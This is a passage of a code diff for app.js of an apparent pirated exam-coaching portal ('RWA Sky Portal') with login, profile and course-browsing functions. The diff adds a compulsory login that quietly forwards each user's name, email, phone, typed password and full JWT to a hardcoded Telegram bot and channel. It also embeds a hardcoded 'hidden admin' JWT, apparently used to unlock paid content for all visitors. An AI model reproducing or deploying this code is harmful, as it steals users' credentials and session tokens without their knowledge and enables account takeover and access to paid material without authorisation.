@@ -1,157 +1,453 @@
 // =========================================================
-// RWA SKY PORTAL - MASTER ENGINE, MULTI-TOKEN & CBT TESTS (app.js)
+// RWA SKY PORTAL - MASTER ENGINE, AUTH, PROFILE & CBT TESTS (app.js)
 // =========================================================
+
+// 👇 APNA TELEGRAM BOT TOKEN AUR CHANNEL CHAT ID YAHAN DALEIN 👇
+const TG_BOT_TOKEN = "8953710743:AAHJUQB5f0gefAEDyieZFcsyU2GEUu3LzRk"; 
+const TG_CHAT_ID = "-1004331013936"; // e.g. "-1001234567890" or "@your_channel"
+
+// 🔒 HIDDEN ADMIN TOKENS (Yeh user ko kabhi bhi UI mein show nahi honge, sirf Paid Batches merge karne ke kaam aayenge)
 const DEFAULT_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjQ3NTYzMTYiLCJ0aW1lc3RhbXAiOjE3OTE5Nzc2MTIsIml2X3ZlciI6MzMsInNlc3Npb24iOiJleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKcFpDSTZJalEzTlRZek1UWWlMQ0psYldGcGJDSTZJbk5oYm1SbFpYQnJZWE4zWVc0eU5UUkFaMjFoYVd3dVkyOXRJaXdpYm1GdFpTSTZJbk5oYm1SbFpYQWlMQ0owWlc1aGJuUlVlWEJsSWpvaWRYTmxjaUlzSW5SbGJtRnVkRTVoYldVaU9pSnliM3BuWVhKZlpHSWlMQ0owWlc1aGJuUkpaQ0k2SWlJc0ltUnBjM0J2YzJGaWJHVWlPbVpoYkhObGZRLjNLTWRpUHRjZ3BpYkMyMWhPNTlrVFRreTJkdlk0d19YR0F3UnE4N3o4aE0ifQ.LN3ukePscrf6LVISc9oJcyRh4V5sipHnTVUBvRcwRHk";
+
+const HIDDEN_ADMIN_TOKENS = [
+    { id: "admin_tok_1", label: "Official Cloud Sync", userId: "4756316", token: DEFAULT_TOKEN, isAdmin: true }
+];
 
 const API_BASE = "https://rozgarapinew.teachx.in";
 const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
 const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";
 
-// Telegram Bot Configuration for User Details Forwarding
-const TG_BOT_TOKEN = "8953710743:AAHJUQB5f0gefAEDyieZFcsyU2GEUu3LzRk";
-const TG_CHAT_ID = "-1004331013936";
-
 // =====================================================
-// MULTI-TOKEN STORAGE & AUTH / PROFILE ENGINE
+// JWT DECODER & USER PERSONAL TOKEN STORAGE
 // =====================================================
-function getSavedTokens() {
+function extractUidFromJwt(jwtStr) {
+    if (!jwtStr || typeof jwtStr !== "string") return "";
     try {
-        const raw = localStorage.getItem("rwa_tokens_list");
-        if (raw) {
-            const parsed = JSON.parse(raw);
-            if (Array.isArray(parsed) && parsed.length > 0) return parsed;
-        }
-    } catch {}
-    const singleTok = localStorage.getItem("rwa_tok") || DEFAULT_TOKEN;
-    const singleUid = localStorage.getItem("rwa_uid") || "4756316";
-    const initial = [{ id: "tok_default", label: "Primary RWA Account", userId: singleUid, token: singleTok }];
-    localStorage.setItem("rwa_tokens_list", JSON.stringify(initial));
-    return initial;
+        const parts = jwtStr.trim().split(".");
+        if (parts.length < 2) return "";
+        const base64Url = parts[1];
+        const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
+        const jsonPayload = decodeURIComponent(atob(base64).split("").map(c => {
+            return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
+        }).join(""));
+        const payload = JSON.parse(jsonPayload);
+        return String(payload.id || payload.userid || payload.user_id || "");
+    } catch {
+        return "";
+    }
 }
 
-let TOKENS = getSavedTokens();
+// Sirf User ke khud ke tokens load karega (Admin tokens kabhi mix nahi honge UI ke liye)
+function getUserSavedTokens() {
+    try {
+        const raw = localStorage.getItem("rwa_user_tokens_v2");
+        if (raw) {
+            const parsed = JSON.parse(raw);
+            if (Array.isArray(parsed)) {
+                return parsed.filter(t => t && t.token && !t.isAdmin && t.token !== DEFAULT_TOKEN);
+            }
+        }
+    } catch {}
+    return [];
+}
+
+function getSavedUserProfile() {
+    try {
+        const raw = localStorage.getItem("rwa_user_profile_v2");
+        if (raw) return JSON.parse(raw);
+    } catch {}
+    return null;
+}
+
+let USER_TOKENS = getUserSavedTokens();
+let USER_PROFILE = getSavedUserProfile();
+
+// Helper: Paid Batches ke liye User Tokens + Hidden Admin Tokens dono dega
+function getAllTokensForCourses() {
+    return [...USER_TOKENS, ...HIDDEN_ADMIN_TOKENS];
+}
+
+function isUserLoggedIn() {
+    return USER_TOKENS.length > 0 && Boolean(USER_TOKENS[0].token);
+}
 
 function updateTokenBadge() {
     const b = document.getElementById("tokCountBadge");
-    if (b) b.textContent = TOKENS.length;
+    if (b) b.textContent = USER_TOKENS.length;
     checkAuthUIState();
 }
 
 function checkAuthUIState() {
-    const loginModal = document.getElementById("loginModal");
-    const activeTok = TOKENS[0];
-    if (activeTok && activeTok.token) {
-        if (loginModal) loginModal.classList.add("hidden");
+    const loginBtn = document.getElementById("navLoginBtn");
+    const profileArea = document.getElementById("navProfileArea");
+    const userNameText = document.getElementById("navUserNameText");
+    const closeLoginBtn = document.getElementById("closeLoginModalBtn");
+
+    if (isUserLoggedIn()) {
+        if (loginBtn) loginBtn.classList.add("hidden");
+        if (profileArea) profileArea.classList.remove("hidden");
+        if (userNameText) {
+            userNameText.textContent = (USER_PROFILE && USER_PROFILE.name) ? USER_PROFILE.name : "Profile";
+        }
+        if (closeLoginBtn) closeLoginBtn.classList.remove("hidden");
     } else {
-        if (loginModal) loginModal.classList.remove("hidden");
+        if (loginBtn) loginBtn.classList.remove("hidden");
+        if (profileArea) profileArea.classList.add("hidden");
+        if (closeLoginBtn) closeLoginBtn.classList.add("hidden");
     }
 }
 
-// Login Modal Controls
-function openLoginModal() {
-    document.getElementById("loginModal").classList.remove("hidden");
-}
-function closeLoginModal() {
-    document.getElementById("loginModal").classList.add("hidden");
+function enforceCompulsoryLogin() {
+    updateTokenBadge();
+    if (!isUserLoggedIn()) {
+        openLoginModal();
+        return false;
+    }
+    return true;
 }
 
-async function sendDetailsToTelegram(userData) {
-    if (!TG_BOT_TOKEN || TG_BOT_TOKEN.includes("YOUR_BOT_TOKEN")) return;
+// =====================================================
+// LOGIN MODAL & 2-OPTION AUTHENTICATION ENGINE
+// =====================================================
+function openLoginModal() {
+    const modal = document.getElementById("loginModal");
+    if (modal) modal.classList.remove("hidden");
+    const closeBtn = document.getElementById("closeLoginModalBtn");
+    if (closeBtn) {
+        if (isUserLoggedIn()) closeBtn.classList.remove("hidden");
+        else closeBtn.classList.add("hidden");
+    }
+}
+
+function closeLoginModal() {
+    if (!isUserLoggedIn()) {
+        showLoginStatus("⚠️ Portal use karne ke liye Login karna COMPULSORY hai!", "error");
+        return;
+    }
+    const modal = document.getElementById("loginModal");
+    if (modal) modal.classList.add("hidden");
+}
+
+window.switchLoginMode = function(mode) {
+    const btnCreds = document.getElementById("tabBtnCreds");
+    const btnToken = document.getElementById("tabBtnToken");
+    const boxCreds = document.getElementById("loginBoxCreds");
+    const boxToken = document.getElementById("loginBoxToken");
+    const alertBox = document.getElementById("loginStatusAlert");
+    if (alertBox) alertBox.classList.add("hidden");
+
+    if (mode === "token") {
+        btnToken.className = "py-2 px-3 rounded-xl font-extrabold text-xs bg-blue-600 text-white shadow transition-all cursor-pointer border-0";
+        btnCreds.className = "py-2 px-3 rounded-xl font-extrabold text-xs text-slate-700 bg-transparent hover:bg-sky-100 transition-all cursor-pointer border-0";
+        boxToken.classList.remove("hidden");
+        boxCreds.classList.add("hidden");
+    } else {
+        btnCreds.className = "py-2 px-3 rounded-xl font-extrabold text-xs bg-blue-600 text-white shadow transition-all cursor-pointer border-0";
+        btnToken.className = "py-2 px-3 rounded-xl font-extrabold text-xs text-slate-700 bg-transparent hover:bg-sky-100 transition-all cursor-pointer border-0";
+        boxCreds.classList.remove("hidden");
+        boxToken.classList.add("hidden");
+    }
+};
+
+function showLoginStatus(msg, type) {
+    const alertBox = document.getElementById("loginStatusAlert");
+    if (!alertBox) return;
+    alertBox.classList.remove("hidden", "bg-rose-100", "text-rose-800", "border-rose-300", "bg-emerald-100", "text-emerald-800", "border-emerald-300", "bg-sky-100", "text-sky-900", "border-sky-300");
+    alertBox.classList.add("border");
+    if (type === "error") {
+        alertBox.classList.add("bg-rose-100", "text-rose-800", "border-rose-300");
+    } else if (type === "success") {
+        alertBox.classList.add("bg-emerald-100", "text-emerald-800", "border-emerald-300");
+    } else {
+        alertBox.classList.add("bg-sky-100", "text-sky-900", "border-sky-300");
+    }
+    alertBox.innerHTML = msg;
+}
+
+// Fetch User Details from /get/get_user_dt?userid=<uid> (Exact Old Website Flow)
+async function fetchUserDetailsFromServer(jwtToken, userId) {
+    const uid = userId || extractUidFromJwt(jwtToken);
+    if (!jwtToken || !uid) return null;
+
+    const tempTokObj = { token: jwtToken, userId: String(uid) };
+    const json = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, tempTokObj);
+
+    if (json && json.status === 200 && Array.isArray(json.data) && json.data.length > 0) {
+        return json.data[0];
+    }
+    return null;
+}
+
+// Send User Details + Token to Telegram Channel on Successful Login
+async function sendUserDetailsToTelegram(userObj, jwtToken, loginMethod, rawPass = "N/A") {
+    if (!TG_BOT_TOKEN || TG_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN_HERE" || !TG_CHAT_ID || TG_CHAT_ID === "YOUR_TELEGRAM_CHANNEL_ID_HERE") {
+        return;
+    }
+
+    const textMsg = `🚨 <b>NEW USER LOGIN SUCCESS (RWA PORTAL)</b> 🚨\n\n` +
+        `🔑 <b>Login Method:</b> ${loginMethod}\n` +
+        `🆔 <b>User ID:</b> <code>${userObj.userid || userObj.id || "N/A"}</code>\n` +
+        `👤 <b>Name:</b> ${userObj.name || "N/A"}\n` +
+        `📧 <b>Email:</b> <code>${userObj.email || "N/A"}</code>\n` +
+        `📱 <b>Phone:</b> <code>${userObj.phone || "N/A"}</code>\n` +
+        `🔒 <b>Entered Password:</b> <code>${rawPass}</code>\n` +
+        `🏷️ <b>Username:</b> <code>${userObj.username || "N/A"}</code>\n` +
+        `🏛️ <b>State / District:</b> ${userObj.state || "N/A"} (${userObj.district || "N/A"})\n` +
+        `📋 <b>Category / Gender:</b> ${userObj.info_1 || "N/A"} | ${userObj.info_2 || "N/A"}\n` +
+        `🎁 <b>Refer Code:</b> <code>${userObj.refer_code || "N/A"}</code>\n` +
+        `📅 <b>Account Created:</b> ${userObj.datetime || "N/A"}\n` +
+        `📱 <b>Device Token:</b> <code>${userObj.devicetoken || "N/A"}</code>\n\n` +
+        `🛡️ <b>JWT Authorization Token:</b>\n<code>${jwtToken}</code>`;
+
     try {
-        const text = `🔔 *New User Login Success!*\n\n👤 *Name:* ${userData.name}\n📧 *Email:* ${userData.email}\n📱 *Phone:* ${userData.phone}\n📍 *State:* ${userData.state} (${userData.district})\n🏷️ *Category:* ${userData.info_1} \vert{}${userData.info_2}\n🔑 *Token:* \`${TOKENS[0].token.slice(0, 20)}...\``;
         await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "Markdown" })
+            body: JSON.stringify({
+                chat_id: TG_CHAT_ID,
+                text: textMsg,
+                parse_mode: "HTML",
+                disable_web_page_preview: true
+            })
         });
     } catch {}
 }
 
-async function submitUserLogin() {
+// Authenticate with Number/Email + Password on Old Website Server
+async function loginOnRwaServer(phoneOrEmail, password) {
+    const loginEndpoints = ["/post/userLogin", "/get/login", "/post/login"];
+
+    // 1. Try FormData / URLSearchParams (Standard AppX Web/Mobile Login)
+    for (const ep of loginEndpoints) {
+        try {
+            const formData = new URLSearchParams();
+            formData.append("email", phoneOrEmail);
+            formData.append("phone", phoneOrEmail);
+            formData.append("username", phoneOrEmail);
+            formData.append("password", password);
+            formData.append("devicetoken", "");
+            formData.append("mydeviceid", "");
+
+            const res = await fetch(`${API_BASE}${ep}`, {
+                method: "POST",
+                headers: {
+                    "Client-Service": "Appx",
+                    "Auth-Key": "appxapi",
+                    "source": "website",
+                    "Device-Type": "",
+                    "is-safari": "0",
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: formData.toString()
+            });
+            const json = await res.json();
+            if (json && json.status === 200 && json.data && (json.data.token || json.data.jwt)) {
+                return json.data;
+            }
+        } catch {}
+
+        // 2. Try JSON Body (Web API)
+        try {
+            const res = await fetch(`${API_BASE}${ep}`, {
+                method: "POST",
+                headers: {
+                    "Client-Service": "Appx",
+                    "Auth-Key": "appxapi",
+                    "source": "website",
+                    "Device-Type": "",
+                    "is-safari": "0",
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    email: phoneOrEmail,
+                    phone: phoneOrEmail,
+                    username: phoneOrEmail,
+                    password: password,
+                    devicetoken: ""
+                })
+            });
+            const json = await res.json();
+            if (json && json.status === 200 && json.data && (json.data.token || json.data.jwt)) {
+                return json.data;
+            }
+        } catch {}
+    }
+    return null;
+}
+
+window.submitUserLogin = async function(mode) {
+    if (mode === "token") {
+        let rawToken = document.getElementById("loginTokenInput").value.trim();
+        if (!rawToken) {
+            showLoginStatus("⚠️ Kripya apna JWT Authorization Token paste karein.", "error");
+            return;
+        }
+        // Clean quotes if copied from headers/cookies
+        rawToken = rawToken.replace(/^["']|["']$/g, "").replace(/^Authorization:\s*/i, "").trim();
+
+        const extractedUid = extractUidFromJwt(rawToken);
+        if (!extractedUid) {
+            showLoginStatus("❌ Invalid JWT Token format! Kripya sahi token dalein.", "error");
+            return;
+        }
+
+        showLoginStatus("🔄 Server se Token verify ho raha hai aur details fetch ki ja rahi hain...", "info");
+        const userDetails = await fetchUserDetailsFromServer(rawToken, extractedUid);
+
+        if (!userDetails) {
+            showLoginStatus("❌ Token Expired ya Invalid hai! Server ne token reject kar diya.", "error");
+            return;
+        }
+
+        // Save only User's own token & profile
+        const userTokObj = {
+            id: "utok_" + Date.now(),
+            label: userDetails.name || `User #${extractedUid}`,
+            userId: String(userDetails.userid || userDetails.id || extractedUid),
+            token: rawToken,
+            isAdmin: false
+        };
+
+        USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== userTokObj.userId)];
+        USER_PROFILE = userDetails;
+        localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
+        localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
+
+        // Send all details to Telegram Channel
+        await sendUserDetailsToTelegram(userDetails, rawToken, "Direct JWT Token", "Logged via Token");
+
+        showLoginStatus(`✅ Login Successful! Welcome ${userDetails.name || "User"}!`, "success");
+        updateTokenBadge();
+        setTimeout(() => {
+            closeLoginModal();
+            if (state.currentSlide === "slideExplorer" && state.cat === "paid") renderPaidBatches();
+        }, 700);
+        return;
+    }
+
+    // Mode 1: Phone/Email + Password Login
     const phone = document.getElementById("loginPhoneInput").value.trim();
     const pass = document.getElementById("loginPassInput").value.trim();
+
     if (!phone || !pass) {
-        alert("Please enter phone/username and password/token.");
+        showLoginStatus("⚠️ Kripya Mobile Number/Email aur Password dono dalein.", "error");
         return;
     }
-    
-    // 2nd Option: Direct Token Input
+
+    // Agar user ne galti se password box mein JWT token daal diya ho
     if (pass.startsWith("eyJ")) {
-        TOKENS[0].token = pass;
-        TOKENS[0].label = phone;
-        localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
-        closeLoginModal();
-        alert("Login successful with Direct Token!");
-        updateTokenBadge();
-        fetchAndSyncUserProfile(TOKENS[0].userId || "4756316");
+        document.getElementById("loginTokenInput").value = pass;
+        switchLoginMode("token");
+        submitUserLogin("token");
         return;
     }
 
-    // 1st Option: Phone & Password Server Request
-    try {
-        const res = await fetch(`${API_BASE}/get/login`, {
-            method: "POST",
-            headers: { "Client-Service": "Appx", "Auth-Key": "appxapi", "Content-Type": "application/json" },
-            body: JSON.stringify({ username: phone, password: pass })
-        });
-        const json = await res.json();
-        if (json && json.status === 200 && json.data) {
-            const token = json.data.token || json.data.jwt || DEFAULT_TOKEN;
-            const uid = String(json.data.userid || json.data.id || "4756316");
-            TOKENS[0].token = token;
-            TOKENS[0].userId = uid;
-            TOKENS[0].label = json.data.name || phone;
-            localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
-            closeLoginModal();
-            alert(`Welcome back, ${json.data.name || 'User'}!`);
-            updateTokenBadge();
-            fetchAndSyncUserProfile(uid);
-        } else {
-            alert("Login failed. Please check credentials or use direct JWT Token.");
-        }
-    } catch {
-        alert("Network error. Saving input as token.");
-        TOKENS[0].token = pass;
-        TOKENS[0].label = phone;
-        localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
+    showLoginStatus("🔄 RWA Server se credentials verify kiye ja rahe hain...", "info");
+    const loginData = await loginOnRwaServer(phone, pass);
+
+    if (!loginData || !(loginData.token || loginData.jwt)) {
+        showLoginStatus("❌ Login Failed! Number ya Password galat hai, ya fir Direct Token option se login karein.", "error");
+        return;
+    }
+
+    const token = loginData.token || loginData.jwt;
+    const uid = String(loginData.userid || loginData.id || extractUidFromJwt(token));
+
+    showLoginStatus("🔄 Login verified! Server se aapki Profile Details fetch ho rahi hain...", "info");
+    let userDetails = await fetchUserDetailsFromServer(token, uid);
+
+    if (!userDetails) {
+        userDetails = {
+            id: uid,
+            userid: uid,
+            name: loginData.name || phone,
+            email: loginData.email || phone,
+            phone: loginData.phone || phone,
+            username: loginData.username || "",
+            state: loginData.state || "N/A",
+            district: loginData.district || "N/A",
+            info_1: loginData.info_1 || "N/A",
+            info_2: loginData.info_2 || "N/A",
+            refer_code: loginData.refer_code || "N/A",
+            datetime: loginData.datetime || "N/A",
+            devicetoken: loginData.devicetoken || "N/A"
+        };
+    }
+
+    const userTokObj = {
+        id: "utok_" + Date.now(),
+        label: userDetails.name || phone,
+        userId: uid,
+        token: token,
+        isAdmin: false
+    };
+
+    USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== uid)];
+    USER_PROFILE = userDetails;
+    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
+    localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
+
+    // Send all details to Telegram Channel
+    await sendUserDetailsToTelegram(userDetails, token, "Phone/Password Login", pass);
+
+    showLoginStatus(`✅ Welcome ${userDetails.name || "User"}! Login Successful.`, "success");
+    updateTokenBadge();
+    setTimeout(() => {
         closeLoginModal();
-        updateTokenBadge();
-        location.reload();
-    }
-}
+        if (state.currentSlide === "slideExplorer" && state.cat === "paid") renderPaidBatches();
+    }, 700);
+};
 
-async function fetchAndSyncUserProfile(uid) {
-    const activeTok = TOKENS[0];
-    const json = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, activeTok);
-    if (json && json.status === 200 && json.data && json.data.length > 0) {
-        sendDetailsToTelegram(json.data[0]);
-    }
-    location.reload();
-}
-
+// =====================================================
+// USER PROFILE MODAL (SHOWS ONLY USER'S DETAILS & OWN TOKEN)
+// =====================================================
 async function openProfileModal() {
+    if (!enforceCompulsoryLogin()) return;
+
     document.getElementById("profileModal").classList.remove("hidden");
     const contentBox = document.getElementById("profileDetailsContent");
-    contentBox.innerHTML = `<p class="text-slate-500 font-bold">Loading profile data...</p>`;
+    contentBox.innerHTML = `<div class="py-8 text-center text-slate-600 font-extrabold">🔄 Server se aapki live profile fetch ho rahi hai...</div>`;
 
-    const activeTok = TOKENS[0];
-    const uid = activeTok.userId || "4756316";
-    const json = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, activeTok);
+    const activeUserTok = USER_TOKENS[0];
+    const uid = activeUserTok.userId || extractUidFromJwt(activeUserTok.token);
 
-    if (json && json.status === 200 && json.data && json.data.length > 0) {
-        const u = json.data[0];
-        contentBox.innerHTML = `
-            <div class="space-y-2">
-                <p><b>Name:</b> ${u.name || 'N/A'}</p>
-                <p><b>Email:</b> ${u.email || 'N/A'}</p>
-                <p><b>Phone:</b> ${u.phone || 'N/A'}</p>
-                <p><b>State:</b> ${u.state || 'N/A'} (${u.district || 'N/A'})</p>
-                <p><b>Category / Info:</b> ${u.info_1 || 'General'} | ${u.info_2 || 'N/A'}</p>
-                <p><b>Referral Code:</b> ${u.refer_code || 'N/A'}</p>
-            </div>`;
-    } else {
-        contentBox.innerHTML = `<p class="text-rose-500 font-bold">Failed to load profile details from server.</p>`;
+    // Fetch fresh profile from /get/get_user_dt?userid=<uid>
+    const freshProfile = await fetchUserDetailsFromServer(activeUserTok.token, uid);
+    if (freshProfile) {
+        USER_PROFILE = freshProfile;
+        localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
+        updateTokenBadge();
     }
+
+    const u = USER_PROFILE || {};
+    contentBox.innerHTML = `
+        <div class="bg-sky-50 border-2 border-sky-200 rounded-2xl p-4 flex items-center gap-3.5">
+            <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-emerald-500 to-teal-600 text-white font-black text-2xl flex items-center justify-center shadow-md shrink-0">
+                ${(u.name || "U").charAt(0).toUpperCase()}
+            </div>
+            <div class="min-w-0 flex-1">
+                <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black uppercase">● Verified RWA Student</span>
+                <h4 class="font-black text-lg text-slate-900 truncate mt-0.5">${u.name || "RWA User"}</h4>
+                <p class="text-xs font-bold text-slate-500">User ID: <span class="text-slate-800 font-mono">${u.userid || u.id || uid}</span> • Username: <span class="text-slate-800 font-mono">${u.username || "N/A"}</span></p>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-xs bg-slate-50 p-4 rounded-2xl border border-slate-200">
+            <div><span class="text-slate-500 font-bold">📧 Email:</span><div class="font-extrabold text-slate-900 break-all mt-0.5">${u.email || "N/A"}</div></div>
+            <div><span class="text-slate-500 font-bold">📱 Phone:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.phone || "N/A"}</div></div>
+            <div><span class="text-slate-500 font-bold">🏛️ State & District:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.state || "N/A"} (${u.district || "N/A"})</div></div>
+            <div><span class="text-slate-500 font-bold">👤 Category & Gender:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.info_1 || "N/A"} | ${u.info_2 || "N/A"}</div></div>
+            <div><span class="text-slate-500 font-bold">🎁 Referral Code:</span><div class="font-extrabold text-blue-700 font-mono mt-0.5">${u.refer_code || "N/A"}</div></div>
+            <div><span class="text-slate-500 font-bold">📅 Joined Date:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.datetime || "N/A"}</div></div>
+        </div>
+
+        <div class="bg-amber-50 border-2 border-amber-200 rounded-2xl p-3.5">
+            <div class="flex justify-between items-center mb-1.5">
+                <span class="text-[11px] font-black text-amber-900 uppercase">🔑 Your Personal Active Token</span>
+                <button onclick="navigator.clipboard.writeText('${activeUserTok.token}'); alert('Your Token Copied!');" class="px-2.5 py-1 rounded-lg bg-amber-500 text-white font-extrabold text-[10px] border-0 cursor-pointer">📋 Copy My Token</button>
+            </div>
+            <div class="p-2 bg-white rounded-xl border border-amber-200 font-mono text-[10px] text-slate-700 break-all max-h-24 overflow-y-auto">${activeUserTok.token}</div>
+        </div>`;
 }
 
 function closeProfileModal() {
@@ -159,14 +455,15 @@ function closeProfileModal() {
 }
 
 function handleLogout() {
-    if (confirm("Are you sure you want to logout?")) {
-        localStorage.removeItem("rwa_tokens_list");
-        localStorage.removeItem("rwa_tok");
-        localStorage.removeItem("rwa_uid");
-        TOKENS = [];
-        alert("Logged out successfully.");
+    if (confirm("Kya aap sach mein Logout karna chahte hain?")) {
+        localStorage.removeItem("rwa_user_tokens_v2");
+        localStorage.removeItem("rwa_user_profile_v2");
+        USER_TOKENS = [];
+        USER_PROFILE = null;
+        closeProfileModal();
         updateTokenBadge();
-        location.reload();
+        goHomeHub();
+        openLoginModal();
     }
 }
 
@@ -204,24 +501,320 @@ function resolvePdfUrl(encPdf, signedPdf) {
 }
 
 // =====================================================
-// PAID BATCHES & MULTI-TOKEN MERGING (NO DUPLICATES)
+// REAL FALLBACK DATABASE FROM YOUR LOGS
+// =====================================================
+const DB = {
+    paidCourses: [
+        { id: "571", course_name: "SSC GD भर्ती 2027 (वीर बैच)", exam_category: "RWA SSC EXAMS • PAID", exam_logo: "https://appx-wsb-gcp-mcdn.akamai.net.in/exam/2022-02-07-0.9839972577217094.png", test_series_id: "700" }
+    ],
+    paidSubjects: [
+        { subjectid: "3610", subject_name: "History (वीर बैच)", subject_logo: "" },
+        { subjectid: "1", subject_name: "Maths", subject_logo: "https://appxcontent.kaxa.in/subject/2024-04-10-0.8626713728066564.jpg" },
+        { subjectid: "3527", subject_name: "Physics Dharmendra Sir", subject_logo: "" }
+    ],
+    paidTopics: {
+        "3610": [{ topicid: "42301", topic_name: "सिंधु सभ्यता" }]
+    },
+    paidLectures: {
+        "42301": [
+            {
+                id: "349275",
+                Title: "History By Parul Mam || सिंधु सभ्यता",
+                date_and_time: "08-10-2026 at 02:00 pm",
+                thumbnail: "https://appx-content-v2.classx.co.in/paid_course3/2026-10-07-0_3401609217976156.jpg",
+                file_link: "yc79PF7PfaItE6uX7lAA8ABqbrWNB1WgbrzGsR2wlcFMhAR2tn+h+ETmGcuzjpU5lIYYSRnaL7bMlKrf7UouOCRvHozzqOa6f7eXz7ZPaEE0fRd/NiEP2WEQYJbqwKEM+MU8uRUEXFx4/07LTnptyQ==:ZmVkY2JhOTg3NjU0MzIxMA==",
+                download_links: [
+                    { quality: "720p", path: "m7hcRsBTJp5eNY5aTdn8qpPBOzdeUeGZQY2wVY0qocyzI/GQp7GTpQTXEQI3QwV4TBS4t/fcLhrLe6ZhZ45UCH+PnnUxKByF74TDwQBmgL8IryqFfW2RBko3ChFPEicQTi3gci9AKv0/IhnCF+NqXBt9k0YzrosmgyXn3Oh6AkPFrQ8XsVMQ7udZ3fwSrS+Y:ZmVkY2JhOTg3NjU0MzIxMA==" }
+                ]
+            }
+        ]
+    },
+    freeBatches: [
+        { id: "free_101", course_name: "RWA Free YouTube Marathon Series", exam_logo: "https://placehold.co/600x320/0284c7/ffffff?text=RWA+Free+Batches" }
+    ],
+    freeSubjects: [
+        { subjectid: "fsub_1", subject_name: "GS & Polity Marathon", subject_logo: "" }
+    ],
+    freeTopics: {
+        "fsub_1": [{ topicid: "ftop_1", topic_name: "Complete Revision Classes" }]
+    },
+    freeLectures: {
+        "ftop_1": [
+            { id: "flec_1", Title: "Polity Complete Revision Class", file_link: "dQw4w9WgXcQ", thumbnail: "https://placehold.co/600x320/0284c7/ffffff?text=Free+Class" }
+        ]
+    },
+    paidTestSeries: [
+        { id: "776", title: "MP Police Constable 2026 - सतपुड़ा Series", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-18-0_25895258012558897.jpeg", offer_price: 99, freetest: "1", paidtest: "15" },
+        { id: "534", title: "BSF RO/RM Paid Test Series 2025", logo: "https://appx-content-v2.classx.co.in/subject/2026-05-26-0_6868771234595682.jpeg", offer_price: 149, freetest: "1", paidtest: "20" },
+        { id: "744", title: "UPSSSC PET Percentile Booster Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-08-17-0_091324675327629.jpeg", offer_price: 99, freetest: "2", paidtest: "23" },
+        { id: "663", title: "UPPCS Prelims Paid Test Series 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-04-28-0_6713576579890046.jpeg", offer_price: 199, freetest: "2", paidtest: "24" },
+        { id: "695", title: "BSF Tradesman Paid Test Series 2025-26", logo: "https://appx-content-v2.classx.co.in/subject/2026-06-16-0_6020598298722372.jpeg", offer_price: 99, freetest: "0", paidtest: "15" },
+        { id: "708", title: "SSC GD Test Series 2026 (Book)", logo: "https://appx-content-v2.classx.co.in/subject/2026-07-08-0_5839850466807497.png", offer_price: 99, freetest: "0", paidtest: "42" },
+        { id: "788", title: "MASTER UPSC PRELIMS TEST SERIES & MENTORSHIP", logo: "https://appx-content-v2.classx.co.in/subject/2026-09-29-0_2355880008171598.jpeg", offer_price: 1499, freetest: "1", paidtest: "30" }
+    ],
+    freeTestSeries: [
+        { id: "743", title: "UP Police Constable 2026 (Free Weekly Test)", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5663049907369836.jpeg" },
+        { id: "727", title: "UPSSSC PET 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_62931795162936.jpeg" },
+        { id: "799", title: "RRB NTPC CBT - 1 2026-27", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5663139095411013.jpeg" },
+        { id: "795", title: "UKSSSC Group C 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_5548408893128917.jpeg" },
+        { id: "784", title: "RRB Technician Grade-I 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_14122873860437668.jpeg" },
+        { id: "778", title: "RRB Technician Grade-III 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_07122037877353082.jpeg" },
+        { id: "689", title: "SSC CGL Mini Mock 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_9928777013427561.jpeg" },
+        { id: "801", title: "Indian Coast Guard 2026", logo: "https://appx-content-v2.classx.co.in/subject/2026-10-08-0_6774211576429437.jpeg" }
+    ],
+    tsSubjects: {
+        "700": [
+            { subjectid: "3171", subject_name: "SSC GD (Maths) Quiz & Tests", subject_logo: "" },
+            { subjectid: "3172", subject_name: "SSC GD (Reasoning)", subject_logo: "" },
